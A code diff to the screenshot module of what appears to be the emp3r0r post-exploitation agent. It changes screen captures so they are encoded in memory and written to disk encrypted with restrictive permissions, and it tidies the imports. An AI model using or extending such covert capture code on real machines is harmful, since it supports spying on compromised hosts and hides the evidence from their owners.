@@ -4,12 +4,14 @@
 package modules
 
 import (
+	"bytes"
 	"fmt"
 	"image/png"
-	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"os"
 	"strconv"
 	"time"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/kbinani/screenshot"
@@ -55,20 +57,24 @@ func Screenshot() (path string, err error) {
 			return
 		}
 		path = fmt.Sprintf("%s-%d_%dx%d.png", timedate, i, bounds.Dx(), bounds.Dy())
-		picfile, e := util.CreateFileAgent(path)
-		if e != nil {
-			err = fmt.Errorf("create %s: %v", path, e)
-			logging.Printf("Create picfile: %v", err)
-			return
-		}
-		logging.Printf("Taken screenshot %s", strconv.Quote(path))
-		defer picfile.Close()
-		err = png.Encode(picfile, img)
+
+		// encode to memory
+		var buf bytes.Buffer
+		err = png.Encode(&buf, img)
 		if err != nil {
 			err = fmt.Errorf("PNG encode: %v", err)
 			logging.Printf("PNG encode: %v", err)
 			return
 		}
+
+		// write encrypted
+		if err = util.WriteFileAgent(path, buf.Bytes(), 0o600); err != nil {
+			err = fmt.Errorf("WriteFileAgent %s: %v", path, err)
+			logging.Printf("WriteFileAgent: %v", err)
+			return
+		}
+
+		logging.Printf("Taken screenshot %s", strconv.Quote(path))
 		pics = append(pics, path)
 	}
 
